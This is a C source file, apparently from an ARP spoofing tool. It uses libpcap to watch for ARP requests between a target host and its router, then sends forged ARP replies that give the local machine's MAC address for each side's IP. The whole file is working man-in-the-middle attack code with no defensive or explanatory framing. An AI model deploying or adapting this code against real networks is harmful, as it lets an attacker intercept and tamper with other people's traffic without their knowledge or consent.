#include <linux/if.h>
#include <linux/if_ether.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <pcap.h>
#include <pcap/pcap.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#include "functions.h"
#include "handle_sniff.h"

void callback(u_char *usr_pointer, const struct pcap_pkthdr *header,
              const u_char *packet) {
  typedef struct {
    char iface[IFNAMSIZ];
    uint32_t target_ip, router_ip;
    uint8_t target_mac[6], router_mac[6];
  } user_struct_t;
  user_struct_t data = *(user_struct_t *)usr_pointer;
  const struct ethhdr ether = *(const struct ethhdr *)packet;
  if (ether.h_proto == htons(ETH_P_ARP)) {
    if (header->caplen < sizeof(struct ethhdr) + sizeof(struct arp_header))
      return;
    struct arp_header arp =
        *(struct arp_header *)(packet + sizeof(struct ethhdr));
    if (arp.op == 1) {
      uint8_t source_mac[6];
      if (!get_local_mac(source_mac, data.iface))
        return;
      if ((arp.spa == data.target_ip && arp.tpa == data.router_ip) ||
          (arp.spa == data.router_ip && arp.tpa == data.target_ip)) {
        send_arp(source_mac, data.router_ip, data.target_mac, data.target_ip,
                 data.iface);
        send_arp(source_mac, data.target_ip, data.router_mac, data.router_ip,
                 data.iface);
      }
    }
  }
}

void wait_handle(const char *iface, uint32_t target_ip, uint8_t *target_mac,
                 uint32_t router_ip, uint8_t *router_mac) {
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t *handle = pcap_open_live(iface, 65535, 1, 1, errbuf);
  if (!handle) {
    fprintf(stderr, "pcap: %s", errbuf);
    exit(1);
  }
  struct {
    char iface[IFNAMSIZ];
    uint32_t target_ip, router_ip;
    uint8_t target_mac[6], router_mac[6];
  } data;
  memset(&data, 0, sizeof(data));
  strncpy(data.iface, iface, IFNAMSIZ);
  data.iface[IFNAMSIZ - 1] = '\0';
  data.target_ip = target_ip;
  data.router_ip = router_ip;
  memcpy(&data.target_mac, target_mac, 6);
  memcpy(&data.router_mac, router_mac, 6);
  pcap_loop(handle, 1, callback, (u_char *)&data);
  pcap_close(handle);
}
